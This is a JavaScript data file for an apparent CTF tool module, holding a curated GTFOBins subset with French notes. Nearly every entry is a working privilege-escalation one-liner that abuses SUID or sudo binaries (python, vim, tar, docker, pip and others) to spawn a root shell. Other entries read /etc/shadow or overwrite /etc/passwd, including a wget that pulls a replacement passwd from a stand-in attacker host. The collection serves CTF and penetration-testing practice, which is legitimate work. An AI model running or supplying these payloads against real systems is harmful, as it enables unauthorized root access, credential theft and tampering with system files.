/* Curated GTFOBins subset for the FS Explorer module
   (spec/fs-explorer/03-architecture.md §6).

   Source: https://gtfobins.github.io/  -- the SUID and sudo
   shell-escape / privilege-escalation one-liners for the binaries most
   likely to show up in a CTF SUID/SGID sweep. Not exhaustive; add
   entries as they come up.

   Shape:  gtfobinsData["<basename>"] = {
     suid: ["<cmd>", ...],   // techniques when the binary is SUID
     sudo: ["<cmd>", ...],   // techniques when allowed via sudo
     cap:  "shell" | "file-read" | "file-write",   // default "shell"
     note: "<explication FR, une phrase>"
   }
   `{bin}` in a command is replaced with the binary's real path by the
   module before it is pasted into the terminal (never run automatically).
   Multi-step techniques (open a pager, then `!sh`) are given as the
   first command with the follow-up described in `note`. */

const gtfobinsData = {
  // --- direct shells --------------------------------------------------
  bash: { suid: ["{bin} -p"], sudo: ["sudo {bin}"], note: "Shell directement. En SUID, -p empêche bash de laisser tomber l'EUID root." },
  sh: { suid: ["{bin} -p"], sudo: ["sudo {bin}"], note: "Shell directement. -p garde l'EUID en SUID." },
  dash: { suid: ["{bin} -p"], sudo: ["sudo {bin}"], note: "Shell directement. -p garde l'EUID en SUID." },
  zsh: { sudo: ["sudo {bin}"], note: "Shell directement via sudo." },
  ksh: { suid: ["{bin} -p"], sudo: ["sudo {bin}"], note: "Shell directement." },
  busybox: { suid: ["{bin} sh"], sudo: ["sudo {bin} sh"], note: "busybox embarque un shell (et des dizaines d'applets)." },

  // --- languages ----------------------------------------------------
  python: {
    suid: ["{bin} -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"],
    sudo: ["sudo {bin} -c 'import os;os.system(\"/bin/sh\")'"],
    note: "Exécute du code arbitraire ; setuid(0) puis /bin/sh donne un shell root.",
  },
  python2: {
    suid: ["{bin} -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"],
    sudo: ["sudo {bin} -c 'import os;os.system(\"/bin/sh\")'"],
    note: "Idem python.",
  },
  python3: {
    suid: ["{bin} -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"],
    sudo: ["sudo {bin} -c 'import os;os.system(\"/bin/sh\")'"],
    note: "Idem python.",
  },
  perl: {
    suid: ["{bin} -e 'use POSIX qw(setuid);POSIX::setuid(0);exec \"/bin/sh\";'"],
    sudo: ["sudo {bin} -e 'exec \"/bin/sh\";'"],
    note: "exec() vers /bin/sh ; setuid(0) d'abord pour un shell root en SUID.",
  },
  ruby: { sudo: ["sudo {bin} -e 'exec \"/bin/sh\"'"], note: "exec() vers /bin/sh via sudo." },
  lua: { sudo: ["sudo {bin} -e 'os.execute(\"/bin/sh\")'"], note: "os.execute() vers /bin/sh via sudo." },
  node: {
    sudo: ["sudo {bin} -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
    note: "child_process.spawn() vers /bin/sh via sudo.",
  },
  php: { sudo: ["sudo {bin} -r \"system('/bin/sh');\""], note: "system() vers /bin/sh via sudo." },

  // --- text processors --------------------------------------------------
  awk: {
    suid: ["{bin} 'BEGIN {system(\"/bin/sh\")}'"],
    sudo: ["sudo {bin} 'BEGIN {system(\"/bin/sh\")}'"],
    note: "L'action BEGIN lance /bin/sh.",
  },
  gawk: { suid: ["{bin} 'BEGIN {system(\"/bin/sh\")}'"], sudo: ["sudo {bin} 'BEGIN {system(\"/bin/sh\")}'"], note: "Idem awk." },
  mawk: { suid: ["{bin} 'BEGIN {system(\"/bin/sh\")}'"], sudo: ["sudo {bin} 'BEGIN {system(\"/bin/sh\")}'"], note: "Idem awk." },
  sed: { sudo: ["sudo {bin} -n '1e exec sh 1>&0' /etc/hosts"], note: "La commande `e` de sed exécute un shell." },
  ed: { suid: ["{bin} /etc/hosts"], sudo: ["sudo {bin} /etc/hosts"], note: "Puis taper `!/bin/sh` pour un shell." },

  // --- pagers / editors ----------------------------------------------
  less: { suid: ["{bin} /etc/profile"], sudo: ["sudo {bin} /etc/profile"], note: "Puis `!/bin/sh` dans le pager." },
  more: { sudo: ["TERM= sudo {bin} /etc/profile"], note: "Puis `!/bin/sh` (forcer un petit terminal)." },
  man: { sudo: ["sudo {bin} man"], note: "man utilise un pager : taper `!/bin/sh`." },
  vim: {
    suid: ["{bin} -c ':py3 import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset;exec sh -p\")'"],
    sudo: ["sudo {bin} -c ':!/bin/sh'"],
    note: "Vim exécute des commandes (`:!` ou `:py3`).",
  },
  vi: {
    suid: ["{bin} -c ':py3 import os;os.setuid(0);os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset;exec sh -p\")'"],
    sudo: ["sudo {bin} -c ':!/bin/sh'"],
    note: "Idem vim.",
  },
  nano: { sudo: ["sudo {bin}"], note: "Ctrl+R Ctrl+X puis `reset; sh 1>&0 2>&0`." },
  ftp: { sudo: ["sudo {bin}"], note: "Puis `!/bin/sh` dans l'invite ftp." },
  gdb: { sudo: ["sudo {bin} -nx -ex 'python import os;os.setuid(0)' -ex '!sh' -ex quit"], note: "GDB exécute du Python et des commandes shell." },
  git: { sudo: ["sudo {bin} -p help config"], note: "Ouvre un pager : taper `!/bin/sh`." },

  // --- wrappers qui gardent l'EUID (SUID) ---------------------------
  env: { suid: ["{bin} /bin/sh -p"], sudo: ["sudo {bin} /bin/sh"], note: "env lance /bin/sh en conservant l'EUID (SUID)." },
  xargs: { suid: ["{bin} -a /dev/null sh -p"], sudo: ["sudo {bin} -a /dev/null sh"], note: "xargs lance sh." },
  flock: { suid: ["{bin} -u / /bin/sh -p"], sudo: ["sudo {bin} -u / /bin/sh"], note: "flock lance /bin/sh." },
  nice: { suid: ["{bin} /bin/sh -p"], sudo: ["sudo {bin} /bin/sh"], note: "nice lance /bin/sh." },
  ionice: { suid: ["{bin} /bin/sh -p"], sudo: ["sudo {bin} /bin/sh"], note: "ionice lance /bin/sh." },
  stdbuf: { suid: ["{bin} -i0 /bin/sh -p"], sudo: ["sudo {bin} -i0 /bin/sh"], note: "stdbuf lance /bin/sh." },
  timeout: { suid: ["{bin} --foreground 7d /bin/sh -p"], sudo: ["sudo {bin} 7d /bin/sh"], note: "timeout lance /bin/sh." },
  taskset: { suid: ["{bin} 1 /bin/sh -p"], sudo: ["sudo {bin} 1 /bin/sh"], note: "taskset lance /bin/sh." },
  setarch: { suid: ["{bin} $(arch) /bin/sh -p"], sudo: ["sudo {bin} $(arch) /bin/sh"], note: "setarch lance /bin/sh." },
  capsh: { suid: ["{bin} --gid=0 --uid=0 --"], sudo: ["sudo {bin} --"], note: "capsh peut ouvrir un shell avec uid/gid 0." },
  watch: { sudo: ["sudo {bin} -x sh -c 'reset; exec sh 1>&0 2>&0'"], note: "watch exécute la commande passée." },

  // --- archives / transfert ---------------------------------------------
  tar: {
    suid: ["{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    sudo: ["sudo {bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    note: "--checkpoint-action=exec lance une commande.",
  },
  zip: { sudo: ["TF=$(mktemp -u); sudo {bin} $TF /etc/hosts -T -TT 'sh #'"], note: "-TT exécute une commande de test d'archive." },
  rsync: { sudo: ["sudo {bin} -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"], note: "-e exécute le shell distant indiqué." },
  ssh: { sudo: ["sudo {bin} -o ProxyCommand=';sh 0<&2 1>&2' x"], note: "ProxyCommand est exécuté par un shell." },
  scp: { sudo: ["echo 'sh 0<&2 1>&2' > /tmp/x; chmod +x /tmp/x; sudo {bin} -S /tmp/x x:"], note: "-S indique le programme de transfert (ici notre script)." },
  socat: { sudo: ["sudo {bin} stdin exec:/bin/sh"], note: "socat relie stdin à /bin/sh." },

  // --- gestionnaires / conteneurs -----------------------------------
  docker: { sudo: ["sudo {bin} run -v /:/mnt --rm -it alpine chroot /mnt sh"], note: "Monte / dans un conteneur et chroot dessus = root sur l'hôte." },
  make: { sudo: ["COMMAND='reset; sh 1>&0 2>&0'; sudo {bin} -s --eval=$'x:\\n\\t-'\"$COMMAND\""], note: "--eval injecte une règle dont la recette est exécutée." },
  "apt-get": { sudo: ["sudo {bin} changelog apt"], note: "Ouvre un pager : taper `!/bin/sh`. (Aussi : APT::Update::Pre-Invoke.)" },
  apt: { sudo: ["sudo {bin} changelog apt"], note: "Ouvre un pager : taper `!/bin/sh`." },
  pip: { sudo: ["TF=$(mktemp -d); echo \"import os;os.execl('/bin/sh','sh')\" > $TF/setup.py; sudo {bin} install $TF"], note: "setup.py est exécuté pendant l'installation." },
  gimp: { sudo: ["sudo {bin} -idf --batch-interpreter=python-fu-eval -b 'import os;os.system(\"/bin/sh\")'"], note: "Interpréteur Python de GIMP en mode batch." },
  journalctl: { sudo: ["sudo {bin}"], note: "Utilise un pager : taper `!/bin/sh` (forcer un petit terminal si besoin)." },

  // --- écriture / lecture de fichier (pas un shell direct) ---------
  chmod: { suid: ["{bin} u+s /bin/bash"], cap: "file-write", note: "Avec les droits root : rendre /bin/bash SUID, puis `/bin/bash -p`." },
  chown: { suid: ["{bin} $(id -un):$(id -gn) /etc/shadow"], cap: "file-write", note: "Se rendre propriétaire d'un fichier sensible (ex. /etc/shadow) pour ensuite le lire/modifier." },
  cp: { suid: ["{bin} -f /etc/passwd /tmp/passwd.orig"], cap: "file-write", note: "Copie avec les droits root : écraser un fichier système (ex. injecter une ligne dans /etc/passwd)." },
  mv: { suid: ["{bin} -f /tmp/passwd.new /etc/passwd"], cap: "file-write", note: "Déplacement avec les droits root : remplacer un fichier système." },
  dd: { suid: ["echo 'DATA' | {bin} of=/etc/passwd"], cap: "file-write", note: "Écriture brute avec les droits root." },
  tee: { suid: ["echo 'DATA' | {bin} -a /etc/passwd"], cap: "file-write", note: "Écrit sur stdout ET dans le fichier, avec les droits root." },
  cat: { suid: ["{bin} /etc/shadow"], cap: "file-read", note: "Lecture de fichier arbitraire (ex. /etc/shadow)." },
  head: { suid: ["{bin} -c1G /etc/shadow"], cap: "file-read", note: "Lecture de fichier arbitraire." },
  tail: { suid: ["{bin} -c1G /etc/shadow"], cap: "file-read", note: "Lecture de fichier arbitraire." },
  base64: { suid: ["{bin} /etc/shadow | base64 -d"], cap: "file-read", note: "Lecture de fichier arbitraire (encodée puis décodée)." },
  openssl: { suid: ["{bin} enc -in /etc/shadow"], cap: "file-read", note: "Lecture de fichier arbitraire." },
  cut: { suid: ["{bin} -d: -f1 /etc/shadow"], cap: "file-read", note: "Lecture de fichier arbitraire." },
  curl: { suid: ["{bin} file:///etc/shadow"], cap: "file-read", note: "Lecture de fichier local (schéma file://)." },
  wget: { suid: ["{bin} -O /etc/passwd http://ATTACKER/passwd"], cap: "file-write", note: "Écrit le fichier téléchargé avec les droits root." },

  // --- nmap (mode --interactive : anciennes versions seulement) -----
  nmap: {
    suid: ["echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse; {bin} --script=/tmp/x.nse"],
    sudo: ["sudo {bin} --interactive"],
    note: "Script NSE Lua qui lance un shell. Sur les vieux nmap : `--interactive` puis `!sh`.",
  },
};
